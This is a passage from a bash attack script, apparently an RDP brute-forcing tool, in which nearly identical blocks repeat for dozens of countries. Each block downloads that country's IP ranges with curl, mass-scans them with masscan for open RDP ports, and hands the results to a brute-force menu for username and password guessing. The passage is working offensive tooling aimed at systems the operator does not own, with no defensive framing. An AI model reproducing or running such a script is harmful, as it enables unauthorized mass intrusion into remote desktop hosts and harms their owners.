	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "93" ]; then
curl http://ipdiapazon.16mb.com/Jordan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "94" ]; then
curl http://ipdiapazon.16mb.com/Kazakhstan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "95" ]; then
curl http://ipdiapazon.16mb.com/Kenya.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "96" ]; then
curl http://ipdiapazon.16mb.com/Kiribati.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "97" ]; then
curl http://ipdiapazon.16mb.com/Korea.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "98" ]; then
curl http://ipdiapazon.16mb.com/Kuwait.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "99" ]; then
curl http://ipdiapazon.16mb.com/Kyrgyzstan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "100" ]; then
curl http://ipdiapazon.16mb.com/Lao.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "101" ]; then
curl http://ipdiapazon.16mb.com/Latvia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "102" ]; then
curl http://ipdiapazon.16mb.com/Lebanon.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "103" ]; then
curl http://ipdiapazon.16mb.com/Lesotho.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "104" ]; then
curl http://ipdiapazon.16mb.com/Libyan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "105" ]; then
curl http://ipdiapazon.16mb.com/Liechtenstein.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "106" ]; then
curl http://ipdiapazon.16mb.com/Lithuania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "107" ]; then
curl http://ipdiapazon.16mb.com/Luxembourg.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "108" ]; then
curl http://ipdiapazon.16mb.com/Macau.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "109" ]; then
curl http://ipdiapazon.16mb.com/Macedonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "110" ]; then
curl http://ipdiapazon.16mb.com/Madagascar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
